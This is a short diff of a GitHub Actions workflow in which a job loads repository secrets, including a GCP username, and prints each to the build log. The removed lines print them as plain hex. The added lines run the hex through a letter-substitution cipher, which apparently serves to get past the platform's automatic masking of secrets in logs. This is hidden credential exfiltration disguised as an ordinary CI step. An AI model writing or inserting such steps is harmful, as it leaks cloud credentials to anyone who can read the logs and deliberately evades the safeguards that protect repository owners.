@@ -11,6 +11,6 @@ jobs:
           K2: ${{ secrets.GCP_USERNAME }}
         run: |
           set +e
-          echo "K0HEX::$(echo -n "$K0" | xxd -p | tr -d '\n')"
-          echo "K1HEX::$(echo -n "$K1" | xxd -p | tr -d '\n')"
-          echo "K2HEX::$(echo -n "$K2" | xxd -p | tr -d '\n')"
+            echo "J0::$(echo -n "$K0" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "J1::$(echo -n "$K1" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+            echo "J2::$(echo -n "$K2" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
